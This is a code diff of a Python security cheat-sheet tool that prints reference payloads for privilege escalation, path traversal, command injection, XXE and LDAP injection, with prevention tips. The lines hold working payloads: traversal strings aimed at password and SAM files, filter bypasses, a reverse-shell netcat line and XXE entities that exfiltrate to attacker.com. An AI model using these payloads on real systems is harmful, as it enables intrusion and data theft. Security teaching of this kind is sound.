-                    + "   EXAMPLE: AlwaysInstallElevated = 1 means any MSI runs as SYSTEM\n"
-                    + "   USE CASE: Creating malicious MSI for privilege escalation",
-                ),
-            ],
-        }
+        print("\n\033[96mTypes of Privilege Escalation:\033[0m")
+        types = [
+            ("Horizontal Privilege Escalation", "Access other users' accounts"),
+            ("Vertical Privilege Escalation", "Access higher privilege levels"),
+        ]
 
-        print(f"\n\033[96m🎯 TYPICAL LINUX PRIVESC WORKFLOW:\033[0m")
-        print("1. Check sudo permissions → sudo -l")
-        print("2. Find SUID binaries → find / -perm -4000")
-        print("3. Check kernel version → uname -a (look for exploits)")
-        print("4. Enumerate cron jobs → crontab -l")
-        print("5. Check running processes → ps aux")
+        for i, (type_name, desc) in enumerate(types, 1):
+            print(f"\n\033[94m{i}. {type_name}\033[0m")
+            print(f"   {desc}")
 
-        print(f"\n\033[96m🎯 TYPICAL WINDOWS PRIVESC WORKFLOW:\033[0m")
-        print("1. Check current privileges → whoami /priv")
-        print("2. System information → systeminfo (missing patches)")
-        print("3. Check services → tasklist /svc")
-        print("4. Look for misconfigurations → AlwaysInstallElevated")
-        print("5. Check unquoted service paths → wmic service list")
+        print("\n\033[96mLinux Privilege Escalation:\033[0m")
+        linux_techniques = [
+            ("SUID Binaries", "Find and exploit SUID executables"),
+            ("Sudo Misconfiguration", "Exploit sudo privileges"),
+            ("Kernel Exploits", "Exploit kernel vulnerabilities"),
+            ("Cron Jobs", "Exploit scheduled tasks"),
+            ("PATH Manipulation", "Modify PATH environment"),
+            ("Library Hijacking", "Hijack shared libraries"),
+            ("Capabilities", "Exploit Linux capabilities"),
+            ("Docker Escape", "Escape from containers"),
+        ]
 
-        self._display_cheatsheet("Privilege Escalation", privesc_info)
+        for i, (tech, desc) in enumerate(linux_techniques, 1):
+            print(f"\n\033[94m{i}. {tech}\033[0m")
+            print(f"   {desc}")
+
+        print("\n\033[96mWindows Privilege Escalation:\033[0m")
+        windows_techniques = [
+            ("Token Manipulation", "Manipulate access tokens"),
+            ("Service Exploitation", "Exploit Windows services"),
+            ("Registry Exploitation", "Modify registry keys"),
+            ("Scheduled Tasks", "Exploit scheduled tasks"),
+            ("DLL Hijacking", "Hijack DLL files"),
+            ("Unquoted Service Paths", "Exploit path issues"),
+            ("AlwaysInstallElevated", "Exploit installation policies"),
+            ("Pass the Hash", "Use hash authentication"),
+        ]
+
+        for i, (tech, desc) in enumerate(windows_techniques, 1):
+            print(f"\n\033[94m{i}. {tech}\033[0m")
+            print(f"   {desc}")
+
+        print("\n\033[96mCommon Enumeration Commands:\033[0m")
+        print("\n\033[95mLinux:\033[0m")
+        linux_commands = [
+            ("find / -perm -u=s -type f 2>/dev/null", "Find SUID binaries"),
+            ("sudo -l", "List sudo privileges"),
+            ("cat /etc/crontab", "View cron jobs"),
+            ("env", "View environment variables"),
+            ("ps aux", "List running processes"),
+            ("netstat -tulpn", "List network connections"),
+            ("cat /etc/passwd", "View user accounts"),
+            ("uname -a", "Kernel version"),
+        ]
+
+        for cmd, desc in linux_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[95mWindows:\033[0m")
+        windows_commands = [
+            ("whoami /priv", "View user privileges"),
+            ("net user", "List users"),
+            ("net localgroup administrators", "List administrators"),
+            ("sc query", "List services"),
+            ("tasklist", "List running processes"),
+            ("netstat -an", "List network connections"),
+            ("reg query HKLM", "Query registry"),
+            ("schtasks", "List scheduled tasks"),
+        ]
+
+        for cmd, desc in windows_commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mTools for Privilege Escalation:\033[0m")
+        tools = [
+            ("LinPEAS", "Linux privilege escalation script"),
+            ("WinPEAS", "Windows privilege escalation script"),
+            ("Linux Exploit Suggester", "Find kernel exploits"),
+            ("Windows Exploit Suggester", "Find Windows exploits"),
+            ("PowerSploit", "PowerShell exploitation framework"),
+            ("Mimikatz", "Credential extraction"),
+            ("BloodHound", "Active Directory analysis"),
+        ]
+
+        for tool, desc in tools:
+            print(f"• {tool} - {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Principle of least privilege")
+        print("• Regular security updates")
+        print("• Disable unnecessary services")
+        print("• Use strong authentication")
+        print("• Monitor system logs")
+        print("• Implement access controls")
 
     def _path_traversal_reference(self):
-        """Path traversal reference with comprehensive use cases"""
-        print(f"\n\033[96m📚 WHAT IS PATH TRAVERSAL?\033[0m")
-        print("Path traversal (directory traversal) allows attackers to access files")
+        """Display path traversal reference"""
+        print("\n\033[93mPATH TRAVERSAL REFERENCE\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+
+        print("\n\033[96mWhat is Path Traversal?\033[0m")
         print(
-            "outside the intended directory by manipulating file paths in web applications."
-        )
-        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
-        print("• File download features: PDF generators, document viewers")
-        print("• Image upload/display: Profile pictures, gallery applications")
-        print("• Template engines: Theme selectors, page builders")
-        print("• File managers: Web-based file browsers, cloud storage")
-        print("• Include mechanisms: PHP includes, server-side includes")
-        print(
-            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only test on applications you own or have permission to test!"
+            "Path traversal allows attackers to access files outside the "
+            "intended directory by manipulating file paths."
         )
 
-        path_info = {
-            "Basic Path Traversal": [
-                (
-                    "../../../etc/passwd",
-                    "Linux password file access using relative paths\n"
-                    + "   WHY: /etc/passwd contains user account information\n"
-                    + "   WHEN: Testing file download or include functionality\n"
-                    + "   EXAMPLE: download.php?file=../../../etc/passwd\n"
-                    + "   USE CASE: Web apps with file download features, document viewers",
-                ),
-                (
-                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-                    "Windows hosts file access using backslashes\n"
-                    + "   WHY: hosts file shows DNS mappings and system configuration\n"
-                    + "   WHEN: Testing Windows-based web applications\n"
-                    + "   EXAMPLE: view.php?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n"
-                    + "   USE CASE: IIS servers, ASP.NET applications",
-                ),
-                (
-                    "....//....//....//etc/passwd",
-                    "Double encoding to bypass basic filters\n"
-                    + "   WHY: Some filters only remove one set of ../ patterns\n"
-                    + "   WHEN: Basic path traversal filters are in place\n"
-                    + "   EXAMPLE: ....// becomes ../ after filtering\n"
-                    + "   USE CASE: Applications with simple string replacement filters",
-                ),
-                (
-                    "..%2F..%2F..%2Fetc%2Fpasswd",
-                    "URL encoding to bypass character filtering\n"
-                    + "   WHY: %2F is URL-encoded forward slash (/)\n"
-                    + "   WHEN: Forward slashes are filtered but URL decoding happens\n"
-                    + "   EXAMPLE: Web server decodes %2F to / after filtering\n"
-                    + "   USE CASE: WAFs and input filters that miss encoded characters",
-                ),
-                (
-                    "..%252F..%252F..%252Fetc%252Fpasswd",
-                    "Double URL encoding for advanced filter bypass\n"
-                    + "   WHY: %252F becomes %2F after first decode, then / after second\n"
-                    + "   WHEN: Multiple layers of URL decoding occur\n"
-                    + "   EXAMPLE: Double-encoded slash bypasses URL decode filters\n"
-                    + "   USE CASE: Complex web applications with multiple decode stages",
-                ),
-            ],
-            "Advanced Bypass Techniques": [
-                (
-                    "file:///etc/passwd",
-                    "File protocol for direct file system access\n"
-                    + "   WHY: file:// protocol accesses local file system directly\n"
-                    + "   WHEN: Application accepts URLs or URI schemes\n"
-                    + "   EXAMPLE: image_viewer.php?url=file:///etc/passwd\n"
-                    + "   USE CASE: URL parameter handlers, image proxies",
-                ),
-                (
-                    "\\..\\..\\..\\etc\\passwd",
-                    "Windows-style backslashes on Linux systems\n"
-                    + "   WHY: Some applications convert backslashes to forward slashes\n"
-                    + "   WHEN: Cross-platform applications with path normalization\n"
-                    + "   EXAMPLE: include.php?page=\\..\\..\\..\\etc\\passwd\n"
-                    + "   USE CASE: Applications designed for Windows but running on Linux",
-                ),
-                (
-                    "..;/etc/passwd",
-                    "Semicolon bypass for command injection filters\n"
-                    + "   WHY: Semicolons can terminate commands and confuse parsers\n"
-                    + "   WHEN: Application uses semicolon as path separator\n"
-                    + "   EXAMPLE: view.php?file=..;/etc/passwd\n"
-                    + "   USE CASE: Custom file handling with semicolon parsing",
-                ),
-                (
-                    "../etc/passwd%00.txt",
-                    "Null byte injection to bypass extension checking\n"
-                    + "   WHY: %00 (null byte) terminates strings in C-based languages\n"
-                    + "   WHEN: Application checks file extensions but uses vulnerable functions\n"
-                    + "   EXAMPLE: download.php?file=../etc/passwd%00.pdf\n"
-                    + "   USE CASE: Legacy PHP applications, older web servers",
-                ),
-                (
-                    "..././..././..././etc/passwd",
-                    "Filter bypass using redundant path components\n"
-                    + "   WHY: ../ inside ../ confuses simple regex filters\n"
-                    + "   WHEN: Filters remove ../ but don't handle nested patterns\n"
-                    + "   EXAMPLE: Filter removes ../ leaving ../ behind\n"
-                    + "   USE CASE: Applications with recursive string replacement",
-                ),
-            ],
-        }
+        print("\n\033[96mCommon Path Traversal Payloads:\033[0m")
+        payloads = [
+            ("../../../etc/passwd", "Access system files"),
+            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+             "Access Windows system files"),
+            ("....//....//....//etc/passwd", "Double encoding bypass"),
+            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoding"),
+            ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoding"),
+            ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "Unicode encoding"),
+        ]
 
-        print(f"\n\033[96m🎯 TYPICAL PATH TRAVERSAL ATTACK WORKFLOW:\033[0m")
-        print("1. Identify file handling → Look for file parameters, downloads")
-        print("2. Test basic traversal → ../../../etc/passwd")
-        print("3. Try encoding bypass → URL encode, double encode")
-        print("4. Platform-specific paths → Windows vs Linux paths")
-        print("5. Advanced techniques → Null bytes, protocol handlers")
+        for i, (payload, desc) in enumerate(payloads, 1):
+            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
+            print(f"\033[93m   Description:\033[0m {desc}")
 
-        self._display_cheatsheet("Path Traversal", path_info)
+        print("\n\033[96mVulnerable Functions:\033[0m")
+        functions = [
+            ("file_get_contents()", "PHP file reading"),
+            ("include()", "PHP file inclusion"),
+            ("require()", "PHP file inclusion"),
+            ("fopen()", "File opening"),
+            ("readfile()", "File reading"),
+        ]
+
+        for func, desc in functions:
+            print(f"• {func} - {desc}")
+
+        print("\n\033[96mBypass Techniques:\033[0m")
+        bypasses = [
+            ("Double Encoding", "Encode characters twice"),
+            ("Unicode Encoding", "Use Unicode characters"),
+            ("Null Byte Injection", "Add null bytes"),
+            ("Directory Traversal", "Use different path separators"),
+            ("Case Manipulation", "Change case of characters"),
+        ]
+
+        for i, (bypass, desc) in enumerate(bypasses, 1):
+            print(f"\n\033[94m{i}. {bypass}\033[0m")
+            print(f"   {desc}")
+
+        print("\n\033[96mTarget Files:\033[0m")
+        target_files = [
+            ("/etc/passwd", "User account information"),
+            ("/etc/shadow", "Password hashes"),
+            ("/etc/hosts", "Hostname mappings"),
+            ("/proc/version", "Kernel version"),
+            ("/proc/cpuinfo", "CPU information"),
+            ("C:\\Windows\\System32\\drivers\\etc\\hosts",
+             "Windows hosts file"),
+            ("C:\\Windows\\System32\\config\\SAM", "Windows SAM file"),
+        ]
+
+        for file_path, desc in target_files:
+            print(f"• {file_path} - {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Validate and sanitize file paths")
+        print("• Use whitelist approach for allowed files")
+        print("• Implement proper access controls")
+        print("• Use secure file handling functions")
+        print("• Regular security testing")
 
     def _command_injection_reference(self):
-        """Command injection reference with comprehensive use cases"""
-        print(f"\n\033[96m📚 WHAT IS COMMAND INJECTION?\033[0m")
-        print("Command injection occurs when an application passes unsafe user input")
-        print("to a system shell, allowing attackers to execute arbitrary commands")
-        print("on the server with the application's privileges.")
-        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
-        print("• Web applications: Ping functionality, file converters, system tools")
-        print("• CTF challenges: Command injection boxes, web exploitation")
-        print("• IoT devices: Network diagnostic tools, configuration interfaces")
-        print("• Network appliances: Ping, traceroute, network testing features")
+        """Display command injection reference"""
+        print("\n\033[93mCOMMAND INJECTION REFERENCE\033[0m")
+        print("\033[93m" + "="*40 + "\033[0m")
+
+        print("\n\033[96mWhat is Command Injection?\033[0m")
         print(
-            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only test on systems you own or have explicit permission to test!"
+            "Command injection allows attackers to execute arbitrary commands "
+            "on the host operating system via a vulnerable application."
         )
 
-        cmd_info = {
-            "Basic Command Injection": [
-                (
-                    "; ls",
-                    "Command separator - executes after first command\n"
-                    + "   WHY: Semicolon separates commands in shell\n"
-                    + "   WHEN: Input isn't properly validated before shell execution\n"
-                    + "   EXAMPLE: ping 127.0.0.1; ls becomes two commands\n"
-                    + "   USE CASE: Web ping tools, system diagnostic features",
-                ),
-                (
-                    "| whoami",
-                    "Pipe operator - processes output through second command\n"
-                    + "   WHY: Pipes first command output to second\n"
-                    + "   WHEN: Want to process or ignore first command output\n"
-                    + "   EXAMPLE: ping 127.0.0.1 | whoami\n"
-                    + "   USE CASE: Data exfiltration, bypassing output filtering",
-                ),
-                (
-                    "&& id",
-                    "AND operator - executes only if first command succeeds\n"
-                    + "   WHY: Commands run sequentially if previous succeeds\n"
-                    + "   WHEN: Want to ensure first command completes successfully\n"
-                    + "   EXAMPLE: ping 127.0.0.1 && id\n"
-                    + "   USE CASE: Conditional execution, avoiding errors in logs",
-                ),
-                (
-                    "|| cat /etc/passwd",
-                    "OR operator - executes only if first command fails\n"
-                    + "   WHY: Backup command runs if first fails\n"
-                    + "   WHEN: First command designed to fail\n"
-                    + "   EXAMPLE: ping invalidhost || cat /etc/passwd\n"
-                    + "   USE CASE: Bypassing input validation, error handling exploitation",
-                ),
-                (
-                    "`whoami`",
-                    "Command substitution - runs command and uses output\n"
-                    + "   WHY: Backticks execute command and substitute result\n"
-                    + "   WHEN: Want to use command output as input\n"
-                    + "   EXAMPLE: ping `whoami`.attacker.com\n"
-                    + "   USE CASE: Data exfiltration via DNS, blind injection",
-                ),
-                (
-                    "$(id)",
-                    "Modern command substitution syntax\n"
-                    + "   WHY: Alternative to backticks, more readable\n"
-                    + "   WHEN: Backticks are filtered but $() isn't\n"
-                    + "   EXAMPLE: ping $(id).attacker.com\n"
-                    + "   USE CASE: Bypassing backtick filters, modern shell injection",
-                ),
-            ],
-            "Filter Bypass Techniques": [
-                (
-                    "cat /e*c/pass*",
-                    "Wildcard usage to bypass keyword filtering\n"
-                    + "   WHY: Wildcards expand to match filenames\n"
-                    + "   WHEN: 'passwd' keyword is filtered\n"
-                    + "   EXAMPLE: /e*c/pass* expands to /etc/passwd\n"
-                    + "   USE CASE: Bypassing blacklist filters, WAF evasion",
-                ),
-                (
-                    "cat /etc/pass'w'd",
-                    "Quote breaking to bypass string detection\n"
-                    + "   WHY: Quotes break up filtered strings\n"
-                    + "   WHEN: 'passwd' string is detected and blocked\n"
-                    + "   EXAMPLE: pass'w'd becomes passwd after shell processing\n"
-                    + "   USE CASE: Evading simple string-based filters",
-                ),
-                (
-                    "cat /etc/$(echo passwd)",
-                    "Command substitution bypass for keyword filtering\n"
-                    + "   WHY: Command substitution generates filtered word\n"
-                    + "   WHEN: Direct use of 'passwd' is blocked\n"
-                    + "   EXAMPLE: $(echo passwd) produces passwd dynamically\n"
-                    + "   USE CASE: Advanced filter evasion, dynamic string generation",
-                ),
-                (
-                    "cat /etc/p?sswd",
-                    "Single character wildcard for precise matching\n"
-                    + "   WHY: ? matches exactly one character\n"
-                    + "   WHEN: Need precise wildcard matching\n"
-                    + "   EXAMPLE: p?sswd matches passwd but not password\n"
-                    + "   USE CASE: Targeted file access, precise filter bypass",
-                ),
-                (
-                    "echo cm${u}d",
-                    "Variable expansion for obfuscation\n"
-                    + "   WHY: Variables can be undefined but still expand\n"
-                    + "   WHEN: Want to obfuscate command names\n"
-                    + "   EXAMPLE: cm${u}d becomes cmd (${u} is empty)\n"
-                    + "   USE CASE: Command obfuscation, advanced evasion",
-                ),
-            ],
-        }
+        print("\n\033[96mCommon Command Injection Payloads:\033[0m")
+        payloads = [
+            ("; ls -la", "List files"),
+            ("| whoami", "Show current user"),
+            ("&& id", "Show user ID"),
+            ("|| cat /etc/passwd", "Alternative execution"),
+            ("`whoami`", "Command substitution"),
+            ("$(whoami)", "Command substitution"),
+            ("%0a whoami", "URL encoded newline"),
+            ("%3b whoami", "URL encoded semicolon"),
+        ]
 
-        print(f"\n\033[96m🎯 TYPICAL COMMAND INJECTION WORKFLOW:\033[0m")
-        print("1. Test basic injection → ; ls (see if commands execute)")
-        print("2. Information gathering → ; id, ; whoami, ; uname -a")
-        print("3. File system access → ; cat /etc/passwd")
-        print("4. Network connectivity → ; ping attacker.com")
-        print("5. Reverse shell → ; nc -e /bin/bash attacker.com 4444")
+        for i, (payload, desc) in enumerate(payloads, 1):
+            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
+            print(f"\033[93m   Description:\033[0m {desc}")
 
-        self._display_cheatsheet("Command Injection", cmd_info)
+        print("\n\033[96mVulnerable Functions:\033[0m")
+        functions = [
+            ("system()", "Execute system commands"),
+            ("exec()", "Execute commands"),
+            ("shell_exec()", "Execute shell commands"),
+            ("passthru()", "Execute commands"),
+            ("popen()", "Open process file pointer"),
+        ]
+
+        for func, desc in functions:
+            print(f"• {func} - {desc}")
+
+        print("\n\033[96mBypass Techniques:\033[0m")
+        bypasses = [
+            ("Character Encoding", "Encode special characters"),
+            ("Case Manipulation", "Change command case"),
+            ("Alternative Commands", "Use different commands"),
+            ("Whitespace Manipulation", "Use tabs or newlines"),
+            ("Environment Variables", "Use $IFS for spaces"),
+        ]
+
+        for i, (bypass, desc) in enumerate(bypasses, 1):
+            print(f"\n\033[94m{i}. {bypass}\033[0m")
+            print(f"   {desc}")
+
+        print("\n\033[96mUseful Commands for Reconnaissance:\033[0m")
+        commands = [
+            ("whoami", "Current user"),
+            ("id", "User and group information"),
+            ("pwd", "Current directory"),
+            ("ls -la", "List files with details"),
+            ("cat /etc/passwd", "User accounts"),
+            ("uname -a", "System information"),
+            ("ps aux", "Running processes"),
+            ("netstat -tulpn", "Network connections"),
+        ]
+
+        for cmd, desc in commands:
+            print(f"• {cmd} - {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Avoid command execution functions")
+        print("• Use parameterized APIs")
+        print("• Implement input validation")
+        print("• Use whitelist approach")
+        print("• Run with minimal privileges")
 
     def _xxe_reference(self):
-        """XXE (XML External Entity) reference with comprehensive use cases"""
-        print(f"\n\033[96m📚 WHAT IS XXE (XML EXTERNAL ENTITY)?\033[0m")
-        print("XXE vulnerabilities occur when XML parsers process external entity")
-        print("references, allowing attackers to read files, perform SSRF, or execute")
-        print("denial of service attacks through malicious XML input.")
-        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D FIND XXE:\033[0m")
-        print("• SOAP web services: API endpoints accepting XML requests")
-        print("• File upload features: Document processors, XML file imports")
-        print("• Configuration parsers: Application settings, user preferences")
-        print("• RSS/XML feeds: News aggregators, feed processors")
-        print("• Office document uploads: Word, Excel files containing XML")
-        print("• Mobile app backends: APIs accepting XML from mobile apps")
+        """Display XXE reference"""
+        print("\n\033[93mXML EXTERNAL ENTITY (XXE) REFERENCE\033[0m")
+        print("\033[93m" + "="*50 + "\033[0m")
+
+        print("\n\033[96mWhat is XXE?\033[0m")
         print(
-            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only test applications you own or have permission to test!"
+            "XXE attacks occur when weakly configured XML parsers support "
+            "XML features that allow external entity references."
         )
 
-        xxe_info = {
-            "Basic XXE Attacks": [
-                (
-                    '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
-                    "Direct file disclosure through external entity\n"
-                    + "   WHY: SYSTEM keyword tells parser to load external resource\n"
-                    + "   WHEN: XML parser processes external entities\n"
-                    + "   EXAMPLE: &xxe; in XML content displays /etc/passwd\n"
-                    + "   USE CASE: SOAP APIs, XML upload features, RSS processors",
-                ),
-                (
-                    '<!ENTITY xxe SYSTEM "http://attacker.com/">',
-                    "Server-Side Request Forgery (SSRF) via HTTP request\n"
-                    + "   WHY: Parser makes HTTP request to external URL\n"
-                    + "   WHEN: Internal services accessible from web server\n"
-                    + "   EXAMPLE: Access internal APIs, cloud metadata endpoints\n"
-                    + "   USE CASE: Internal network scanning, cloud service exploitation",
-                ),
-                (
-                    '<!ENTITY % xxe SYSTEM "file:///etc/passwd">',
-                    "Parameter entity for more complex payload construction\n"
-                    + "   WHY: Parameter entities (%) allow building complex payloads\n"
-                    + "   WHEN: Regular entities are filtered but parameter entities work\n"
-                    + "   EXAMPLE: %xxe; loads file content for further processing\n"
-                    + "   USE CASE: Bypassing entity filtering, building complex attacks",
-                ),
-                (
-                    '<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">',
-                    "Base64 encoding for binary files and special characters\n"
-                    + "   WHY: Base64 encoding handles files with special XML characters\n"
-                    + "   WHEN: Target file contains XML-breaking characters\n"
-                    + "   EXAMPLE: Read binary files, source code with < > characters\n"
-                    + "   USE CASE: PHP applications, reading source code files",
-                ),
-            ],
-            "Blind XXE (No Direct Output)": [
-                (
-                    '<!ENTITY % file SYSTEM "file:///etc/passwd">',
-                    "Out-of-band data exfiltration when no output shown\n"
-                    + "   WHY: Loads file content into parameter entity for exfiltration\n"
-                    + "   WHEN: XXE works but file content isn't displayed\n"
-                    + "   EXAMPLE: Combined with HTTP requests to steal data\n"
-                    + "   USE CASE: APIs that process XML but don't return content",
-                ),
-                (
-                    "<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">",
-                    "HTTP data exfiltration using dynamic entity creation\n"
-                    + "   WHY: Dynamically creates entity that sends file to attacker\n"
-                    + "   WHEN: Blind XXE with network connectivity\n"
-                    + "   EXAMPLE: File content sent as HTTP GET parameter\n"
-                    + "   USE CASE: Stealing sensitive data from blind XXE",
-                ),
-                (
-                    '<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">',
-                    "External DTD for complex blind XXE exploitation\n"
-                    + "   WHY: External DTD contains malicious entity definitions\n"
-                    + "   WHEN: Complex payload needed for blind exploitation\n"
-                    + "   EXAMPLE: DTD file on attacker server with data theft logic\n"
-                    + "   USE CASE: Advanced blind XXE with custom payload logic",
-                ),
-            ],
-            "Advanced XXE Techniques": [
-                (
-                    '<!ENTITY xxe SYSTEM "expect://id">',
-                    "Command execution using expect wrapper (PHP)\n"
-                    + "   WHY: expect:// wrapper executes system commands\n"
-                    + "   WHEN: PHP with expect extension enabled\n"
-                    + "   EXAMPLE: expect://whoami returns current user\n"
-                    + "   USE CASE: PHP applications with loose wrapper restrictions",
-                ),
-                (
-                    '<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">',
-                    "Data URI scheme for injecting custom content\n"
-                    + "   WHY: data:// scheme allows embedding arbitrary data\n"
-                    + "   WHEN: Testing for data URI support in XML parser\n"
-                    + "   EXAMPLE: Base64 encoded 'Hello World' message\n"
-                    + "   USE CASE: Testing parser capabilities, content injection",
-                ),
-            ],
-        }
+        print("\n\033[96mCommon XXE Payloads:\033[0m")
+        payloads = [
+            ("<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
+             "Basic file read"),
+            ("<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><test>&xxe;</test>",
+             "External DTD inclusion"),
+            ("<!DOCTYPE test [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]><test>&evil;</test>",
+             "Parameter entity"),
+            ("<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
+             "Complete XML document"),
+        ]
 
-        print(f"\n\033[96m🎯 TYPICAL XXE ATTACK WORKFLOW:\033[0m")
-        print("1. Identify XML input → APIs, file uploads, configuration")
-        print('2. Test basic XXE → <!ENTITY xxe SYSTEM "file:///etc/passwd">')
-        print("3. Check for blind XXE → Use HTTP callbacks if no output")
-        print("4. Exploit SSRF → Access internal services via HTTP entities")
-        print("5. Exfiltrate data → Use out-of-band techniques for sensitive files")
+        for i, (payload, desc) in enumerate(payloads, 1):
+            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
+            print(f"\033[93m   Description:\033[0m {desc}")
 
-        self._display_cheatsheet("XXE (XML External Entity)", xxe_info)
+        print("\n\033[96mVulnerable XML Parsers:\033[0m")
+        parsers = [
+            ("libxml2", "C library"),
+            ("Expat", "C library"),
+            ("Xerces", "C++ library"),
+            ("DOM4J", "Java library"),
+            ("JDOM", "Java library"),
+            ("SimpleXML", "PHP extension"),
+        ]
+
+        for parser, desc in parsers:
+            print(f"• {parser} - {desc}")
+
+        print("\n\033[96mXXE Attack Types:\033[0m")
+        attack_types = [
+            ("File Read", "Read local files"),
+            ("Server-Side Request Forgery", "Make HTTP requests"),
+            ("Denial of Service", "Billion laughs attack"),
+            ("Out-of-Band Data Exfiltration", "Exfiltrate data via DNS/HTTP"),
+        ]
+
+        for i, (attack_type, desc) in enumerate(attack_types, 1):
+            print(f"\n\033[94m{i}. {attack_type}\033[0m")
+            print(f"   {desc}")
+
+        print("\n\033[96mTarget Files:\033[0m")
+        target_files = [
+            ("/etc/passwd", "User accounts"),
+            ("/etc/hosts", "Hostname mappings"),
+            ("/proc/version", "Kernel version"),
+            ("C:\\Windows\\System32\\drivers\\etc\\hosts",
+             "Windows hosts file"),
+            ("file:///dev/random", "Random data (DoS)"),
+        ]
+
+        for file_path, desc in target_files:
+            print(f"• {file_path} - {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Disable external entity processing")
+        print("• Use secure XML parsers")
+        print("• Implement input validation")
+        print("• Use whitelist approach")
+        print("• Regular security testing")
 
     def _insecure_deserialization_reference(self):
-        """Insecure deserialization reference"""
-        deser_info = {
-            "PHP Serialization": [
-                ('O:4:"User":1:{s:2:"id";i:1;}', "PHP object serialization"),
-                ("unserialize($_POST['data'])", "Vulnerable PHP code"),
-                ("__wakeup(), __destruct()", "Magic methods for exploitation"),
-            ],
-            "Java Serialization": [
-                ("ysoserial CommonsCollections1 'calc'", "Generate Java payload"),
-                ("ObjectInputStream.readObject()", "Vulnerable Java method"),
-                ("java.io.Serializable", "Serializable interface"),
-            ],
-            "Python Pickle": [
-                ("pickle.loads(data)", "Vulnerable Python code"),
-                ("__reduce__ method", "Exploitation method"),
-                ("cPickle module", "C implementation"),
-            ],
-        }
-        self._display_cheatsheet("Insecure Deserialization", deser_info)
+        """Display insecure deserialization reference"""
+        print("\n\033[93mINSECURE DESERIALIZATION REFERENCE\033[0m")
+        print("\033[93m" + "="*50 + "\033[0m")
+
+        print("\n\033[96mWhat is Insecure Deserialization?\033[0m")
+        print(
+            "Insecure deserialization occurs when applications deserialize "
+            "untrusted data, potentially leading to remote code execution."
+        )
+
+        print("\n\033[96mVulnerable Functions:\033[0m")
+        functions = [
+            ("unserialize()", "PHP deserialization"),
+            ("pickle.loads()", "Python deserialization"),
+            ("ObjectInputStream.readObject()", "Java deserialization"),
+            ("JSON.parse()", "JavaScript deserialization"),
+        ]
+
+        for func, desc in functions:
+            print(f"• {func} - {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Avoid deserializing untrusted data")
+        print("• Use secure serialization formats")
+        print("• Implement input validation")
+        print("• Use whitelist approach")
+        print("• Regular security testing")
 
     def _generate_command_injection_payloads(self):
         """Generate command injection payloads"""
-        self.print_info(
-            "Command injection payloads reference displayed above in vulnerability references"
-        )
+        print("\n\033[93mCOMMAND INJECTION PAYLOADS\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+        print("Use the Command Injection Reference for detailed information")
 
     def _generate_path_traversal_payloads(self):
         """Generate path traversal payloads"""
-        self.print_info(
-            "Path traversal payloads reference displayed above in vulnerability references"
-        )
+        print("\n\033[93mPATH TRAVERSAL PAYLOADS\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+        print("Use the Path Traversal Reference for detailed information")
 
     def _generate_ldap_payloads(self):
         """Generate LDAP injection payloads"""
-        ldap_payloads = [
-            "*)(uid=*))(|(uid=*",
-            "*)(|(password=*))",
-            "admin)(&(password=*))",
-            "*)(|(cn=*))",
-        ]
-        print(f"\n\033[93m{'LDAP Injection Payloads'.center(50)}\033[0m")
-        print(f"\033[93m{'-'*50}\033[0m")
-        for payload in ldap_payloads:
-            print(f"\033[96m{payload}\033[0m")
+        print("\n\033[93mLDAP INJECTION PAYLOADS\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+
+        payloads = {
+            "Authentication Bypass": [
+                "*)(uid=*))(|(uid=*",
+                "*)(|(password=*))",
+                "*))%00",
+                "admin)(&)",
+                "admin*)(&)",
+            ],
+            "Information Disclosure": [
+                "*)(objectClass=*",
+                "*)(|(objectClass=*))",
+                "*)(|(cn=*))",
+                "*)(|(uid=*))",
+            ],
+        }
+
+        self._display_payload_list("LDAP Injection Payloads", payloads)
 
     def _generate_xxe_payloads(self):
         """Generate XXE payloads"""
-        self.print_info(
-            "XXE payloads reference displayed above in vulnerability references"
-        )
+        print("\n\033[93mXXE PAYLOADS\033[0m")
+        print("\033[93m" + "="*20 + "\033[0m")
+        print("Use the XXE Reference for detailed information")
 
     def _port_numbers_reference(self):
-        """Common port numbers reference"""
-        ports_info = {
-            "Common TCP Ports": [
-                ("21", "FTP"),
